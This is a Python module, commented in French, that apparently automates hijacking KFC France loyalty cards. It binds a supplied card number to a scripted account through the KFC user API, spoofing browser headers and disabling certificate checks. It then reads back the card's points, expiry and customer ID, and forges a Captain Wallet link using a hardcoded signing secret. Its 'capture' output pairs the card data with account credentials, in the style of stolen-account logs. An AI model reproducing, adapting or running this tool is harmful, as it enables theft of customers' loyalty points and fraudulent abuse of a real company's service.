"""
Injecteur : associe un compte KFC (profil) à un numéro de carte fidélité (login)
et vérifie le résultat via l'API loyaltyinfo.

Fonction autonome : une seule entrée, pas de session ni callback externes.

Usage:
    result = await inject(profile, login)
    if result[0] == "success":
        capture, capture2 = result[1], result[2]
    else:
        error_code, error_message = result[1], result[2]
"""
import asyncio
import aiohttp
import hashlib
import os
import time
import ssl

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ERROR_LOG_PATH = os.path.join(SCRIPT_DIR, "injecteur_error_log.txt")

TIMEOUT = 20
MAX_RETRIES = 3


def _log(error_type: str, message: str, login: str) -> None:
    try:
        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(ERROR_LOG_PATH, "a", encoding="utf-8", errors="ignore") as f:
            f.write(f"[{ts}] [{error_type}] login={login!r} - {message}\n")
    except Exception:
        pass


async def inject(profile, login):
    """
    Associe le profil (compte KFC) au numéro de carte fidélité login, vérifie le résultat.

    Args:
        profile: dict avec id, name1, name2, mail, password, num, ddn, jour, mois, annee
                 (ex. creation_log.create_account()["account"]).
        login: numéro de carte fidélité à associer au compte.

    Returns:
        ("success", capture, capture2) si la carte récupérée est égale à login
        ("error", error_code, error_message) sinon (error_code pour différencier les cas).
    """
    if profile is None or profile == "erreur" or not isinstance(profile, dict) or not profile.get("id"):
        msg = "Profil invalide ou manquant (dict avec id, name1, name2, mail, password, num, ddn, jour, mois, annee)."
        _log("profile_invalid", msg, str(login))
        return "error", "profile_invalid", msg

    idd = profile.get("id")
    name1 = profile.get("name1")
    name2 = profile.get("name2")
    mail = profile.get("mail")
    password = profile.get("password")
    num = profile.get("num")
    ddn = profile.get("ddn")
    jour = profile.get("jour")
    mois = profile.get("mois")
    annee = profile.get("annee")

    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
    # Même politique SSL que dans creation_log : désactiver la vérification du certificat
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    for attempt in range(MAX_RETRIES):
        try:
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.post(
                    f"https://13.248.197.133/api/users/{idd}",
                    data=f'{{"loyaltyId":"{login}","id":"{idd}","gender":null,"firstName":"{name1}","lastName":"{name2}","phoneNumber":"{num}","email":"{mail}","marketingOptIn":false,"birthYear":{annee},"birthMonth":{mois},"subscribeChannel":[0,0],"birthDay":{jour},"dob":"{ddn}"}}',
                    headers={
                        "Sec-CH-UA-Platform": '"Windows"',
                        "Accept-Language": "fr-FR,fr;q=0.9",
                        "Sec-CH-UA": '"Not_A Brand";v="99", "Chromium";v="142"',
                        "Sec-CH-UA-Mobile": "?0",
                        "Culturecode": "fr",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
                        "Accept": "application/json, text/plain, */*",
                        "Content-Type": "application/json",
                        "Origin": "https://www.kfc.fr",
                        "Sec-Fetch-Site": "same-origin",
                        "Sec-Fetch-Mode": "cors",
                        "Sec-Fetch-Dest": "empty",
                        "Referer": "https://www.kfc.fr/my-account/edit",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Priority": "u=1, i",
                    },
                    ssl=ssl_ctx,
                ) as response1:
                    if response1.status >= 400:
                        try:
                            body1 = (await response1.text())[:200]
                        except Exception:
                            body1 = "(body non lu)"
                        msg = f"HTTP {response1.status} - {body1}"
                        _log("post_users_fail", msg, str(login))
                        return "error", "post_users_fail", msg

                async with session.get(
                    f"https://13.248.197.133/api/users/{idd}/loyaltyinfo",
                    headers={
                        "Sec-CH-UA-Platform": '"Windows"',
                        "Accept-Language": "fr-FR,fr;q=0.9",
                        "Sec-CH-UA": '"Not_A Brand";v="99", "Chromium";v="142"',
                        "Sec-CH-UA-Mobile": "?0",
                        "Culturecode": "fr",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
                        "Accept": "application/json, text/plain, */*",
                        "Content-Type": "application/json",
                        "Origin": "https://www.kfc.fr",
                        "Sec-Fetch-Site": "same-origin",
                        "Sec-Fetch-Mode": "cors",
                        "Sec-Fetch-Dest": "empty",
                        "Referer": "https://www.kfc.fr/my-account/edit",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Priority": "u=1, i",
                    },
                    ssl=ssl_ctx,
                ) as response2:
                    if response2.status >= 400:
                        msg = f"HTTP {response2.status} (loyaltyinfo)"
                        _log("loyaltyinfo_fail", msg, str(login))
                        return "error", "loyaltyinfo_http_error", msg

                    try:
                        response_data2 = await response2.json()
                    except Exception:
                        response_data2 = None

                    if response_data2 is None:
                        msg = "Réponse JSON invalide ou vide (loyaltyinfo)"
                        _log("loyaltyinfo_parse", msg, str(login))
                        if attempt == MAX_RETRIES - 1:
                            return "error", "loyaltyinfo_parse", msg
                        await asyncio.sleep(0.5)
                        continue

                    try:
                        response_text_2 = str(response_data2)
                        carte = response_data2.get("loyaltyId")
                        point = response_data2.get("loyaltyPoints")
                        date = response_data2.get("pointExpireDate")
                        customerid = response_data2.get("customerId")
                        qrcode = response_data2.get("qrData")
                        if customerid:
                            signature = customerid + "9[<@%yA8pg2{-=W"
                            hash_result = hashlib.sha256(signature.encode()).hexdigest()
                            url_captain = f"https://kfc.captainwallet.com/fr_FR/loyalty?user%5Bidentifier%5D={customerid}&channel=web&tag=myaccount&signature={hash_result}"
                        else:
                            url_captain = "ERROR : id"
                        capture = f'"carte": "{carte}", "cartiId": "{customerid}", "point": "{point}", "date": "{date}", "url": "{url_captain}"'
                        capture2 = f'"idd": "{idd}", "prenom": "{name1}", "nom": "{name2}", "mail": "{mail}", "password": "{password}", "numero": "{num}", "ddb": "{ddn}", "jour": "{jour}", "mois": "{mois}", "annee": "{annee}"'

                        if carte == login:
                            return "success", capture, capture2

                        if not carte:
                            msg = f"pas de loyaltyId dans la réponse | point={point}"
                            _log("loyalty_no_carte", msg, str(login))
                            return "error", "loyalty_no_carte", msg
                        if point is None:
                            msg = f"loyaltyPoints absent | carte={carte!r}"
                            _log("loyalty_no_points", msg, str(login))
                            return "error", "loyalty_no_points", msg
                        if carte != login:
                            msg = f"carte récupérée={carte!r} != login fourni={login!r} | point={point}"
                            _log("loyalty_mismatch", msg, str(login))
                            return "error", "loyalty_mismatch", msg
                        msg = f"réponse inattendue | carte={carte!r} point={point} qr={bool(qrcode)} - {response_text_2[:80]}"
                        _log("loyalty_unexpected", msg, str(login))
                        return "error", "loyalty_unexpected", msg

                    except Exception as e:
                        msg = f"Erreur parsing loyaltyinfo: {str(e)[:100]}"
                        _log("response_parsing", msg, str(login))
                        if attempt == MAX_RETRIES - 1:
                            return "error", "response_parsing", msg
                        await asyncio.sleep(0.5)
                        continue

        except asyncio.TimeoutError:
            msg = f"Timeout après {TIMEOUT}s (tentative {attempt+1}/{MAX_RETRIES})"
            _log("timeout", msg, str(login))
            if attempt == MAX_RETRIES - 1:
                return "error", "timeout", msg
            await asyncio.sleep(0.5)

        except aiohttp.ServerDisconnectedError as e:
            msg = f"Server disconnected: {str(e)[:100]}"
            _log("server_disconnect", msg, str(login))
            if attempt == MAX_RETRIES - 1:
                return "error", "server_disconnect", msg
            await asyncio.sleep(1)

        except aiohttp.ClientConnectorError as e:
            msg = f"Connection failed: {str(e)[:100]}"
            _log("connection", msg, str(login))
            if attempt == MAX_RETRIES - 1:
                return "error", "connection_error", msg
            await asyncio.sleep(0.5)

        except aiohttp.ClientError as e:
            msg = f"{type(e).__name__}: {str(e)[:100]}"
            _log("client_error", msg, str(login))
            if attempt == MAX_RETRIES - 1:
                return "error", "client_error", msg
            await asyncio.sleep(0.5)

        except Exception as e:
            msg = f"{type(e).__name__}: {str(e)[:100]}"
            _log("unknown", msg, str(login))
            if attempt == MAX_RETRIES - 1:
                return "error", "unknown", msg
            await asyncio.sleep(0.5)

    return "error", "max_retries", f"Nombre max de tentatives ({MAX_RETRIES}) atteint pour {login}"
